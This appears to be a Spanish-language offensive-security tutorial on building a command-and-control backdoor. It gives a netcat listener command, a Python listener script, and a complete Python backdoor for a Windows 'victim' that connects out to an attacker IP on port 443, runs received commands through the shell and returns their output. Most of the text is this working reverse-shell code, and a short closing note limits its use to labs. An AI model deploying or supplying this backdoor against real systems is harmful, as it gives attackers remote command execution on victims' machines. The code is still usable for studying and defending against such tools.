
------
- TAG: #Desarrollo #Backdoors #Control #Remoto 
----

En esta clase, nos adentraremos en el mundo de los backdoors y los sistemas de Command and Control (**C&C**). Nuestro objetivo será crear un ejemplo práctico de un ejecutable que, una vez en la máquina víctima, nos permita operar desde un centro de comando y control creado manualmente en Python. Esta herramienta nos dará la capacidad de controlar y ejecutar una variedad de operaciones en la máquina comprometida de forma automática.

El backdoor que desarrollaremos actuará como una puerta trasera en la máquina objetivo, proporcionándonos acceso remoto y control sobre el sistema. Por otro lado, el sistema C&C será el centro de operaciones desde donde enviaremos comandos y recibiremos información de la máquina infectada. Este sistema es esencial en operaciones ofensivas avanzadas, ya que nos permite gestionar múltiples backdoors y coordinar acciones complejas en los sistemas comprometidos.

Durante la clase, exploraremos cómo se pueden diseñar y desplegar backdoors eficaces y cómo se estructura un sistema C&C para maximizar su efectividad. También abordaremos la importancia de los sistemas C2 (Command and Control) en la ciberseguridad ofensiva, especialmente en lo que respecta a la automatización y la gestión remota de tareas en máquinas comprometidas.

Esta sesión te proporcionará conocimientos prácticos y habilidades esenciales para entender y desarrollar sistemas de backdoors y C&C, herramientas fundamentales para cualquier operación ofensiva en el ámbito de la ciberseguridad.

---

# Implementación de Listener y Backdoor en Linux y Windows

En este tutorial, vamos a crear un proyecto simple de C2 (Command and Control) usando **Python** y **Netcat** para establecer conexiones entre una máquina atacante (Linux) y una víctima (Windows). Esto simula una comunicación cliente-servidor, donde la máquina Windows se conecta a la máquina atacante y ejecuta comandos.

---

## Parte 1: Configuración en Linux

### 1. Crear un directorio para el proyecto
Primero, creamos un directorio donde guardaremos los archivos del proyecto. Este directorio también será el lugar donde recibiremos la conexión desde la máquina Windows.

```bash
mkdir C2
cd C2
```

### 2. Probar la conexión con Netcat
Antes de escribir los scripts en Python, podemos realizar una prueba rápida con Netcat para asegurarnos de que nuestra máquina está escuchando conexiones en el puerto correcto.

```bash
nc -nlvp 443
```

Este comando:
- `-n`: No realiza resolución DNS.
- `-l`: Escucha conexiones entrantes.
- `-v`: Modo verbose, muestra más detalles sobre las conexiones.
- `-p 443`: Escucha en el puerto 443 (típico para conexiones HTTPS).

Si la prueba es exitosa, podemos proceder a crear un listener en Python.

### 3. Crear el listener en Python

Creamos un archivo llamado `listener.py` usando `nvim` o cualquier editor de texto:

```bash
nvim listener.py
```

Agregamos el siguiente script Python que actuará como el **servidor** o **listener** que espera conexiones entrantes:

```python
#!/usr/bin/python3

import socket

if __name__ == '__main__':

    # Crear un socket TCP/IP
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Habilitar la reutilización del puerto
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # Asignar la IP del atacante y el puerto 443
    server_socket.bind(("ip_de_atacante", 443))

    # Escuchar conexiones entrantes
    server_socket.listen()
    print(f"\n[+] Listening for incoming connections...")

    # Aceptar la conexión del cliente
    client_socket, client_address = server_socket.accept()
    print(f"\n[+] Connection established by {client_address}")

    # Mantener la conexión activa para recibir comandos
    while True:
        command = input(">> ")  # Leer comando del atacante
        client_socket.send(command.encode())  # Enviar comando al cliente

        # Recibir la respuesta del comando ejecutado en la máquina víctima
        command_output = client_socket.recv(1024).decode()

        # Mostrar la salida del comando
        print(command_output)
```

#### Explicación del código:
- **Socket**: El script crea un socket de tipo TCP/IP usando `AF_INET` (familia de direcciones IPv4) y `SOCK_STREAM` (protocolo TCP).
- **REUSEADDR**: Habilita la reutilización del puerto para evitar el error "Address already in use".
- **Bind**: El servidor se asocia a la IP del atacante y al puerto 443.
- **Listen**: El servidor se pone en modo escucha esperando conexiones entrantes.
- **Accept**: Se acepta la conexión de un cliente y se guarda la información del cliente conectado.
- **Comandos**: Se envían comandos desde el atacante a la víctima y se muestran las respuestas.

---

## Parte 2: Configuración en Windows

### 1. Crear un archivo `.txt` y convertirlo en un Backdoor

En la máquina **Windows11**, creamos un archivo `.txt` para posteriormente convertirlo en un archivo Python (`backdoor.py`). Esto se puede hacer desde la línea de comandos de Windows.

### 2. Script de la Backdoor en Python

Ahora, abrimos **IDLE** o cualquier editor de texto en Windows y creamos un archivo llamado `backdoor.py` con el siguiente contenido:

```python
#!/usr/bin/python3

import socket
import subprocess

# Función para ejecutar comandos del sistema
def run_command(command):
    # Ejecuta el comando y captura su salida
    command_output = subprocess.check_output(command, shell=True)
    return command_output.decode("cp850")  # Usamos cp850 para codificación en Windows

if __name__ == '__main__':
    # Crear un socket TCP/IP
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Conectarse a la IP del atacante y el puerto 443
    client_socket.connect(("la_ip_atacante", 443))

    # Bucle infinito para recibir y ejecutar comandos
    while True:
        # Recibir comando del atacante
        command = client_socket.recv(1024).decode().strip()

        # Ejecutar el comando recibido y capturar la salida
        command_output = run_command(command)

        # Enviar la salida del comando

```python
        client_socket.send(b"\n" + command_output.encode() + b"\n\n")

    # Cerrar la conexión cuando termine
    client_socket.close()
```

#### Explicación del código:
- **subprocess**: El módulo `subprocess` permite ejecutar comandos del sistema operativo desde Python.
- **run_command**: Esta función ejecuta el comando recibido usando `subprocess.check_output()` y devuelve el resultado decodificado usando "cp850" (la codificación de caracteres que usa Windows por defecto en la consola).
- **Socket**: Similar al listener en Linux, este script crea un socket TCP que se conecta a la IP del atacante en el puerto 443.
- **recv**: Espera recibir un comando del servidor (la máquina atacante) y lo ejecuta en la máquina Windows.
- **send**: Envía el resultado del comando ejecutado de vuelta al servidor (máquina atacante).

---

### Nota Final:
Este tutorial es un ejemplo educativo de cómo se puede establecer una comunicación cliente-servidor entre dos máquinas mediante Python y sockets. El uso indebido de este tipo de scripts puede ser ilegal. Asegúrate de usarlo solo en entornos controlados y con fines educativos o de prueba dentro de un laboratorio.

---

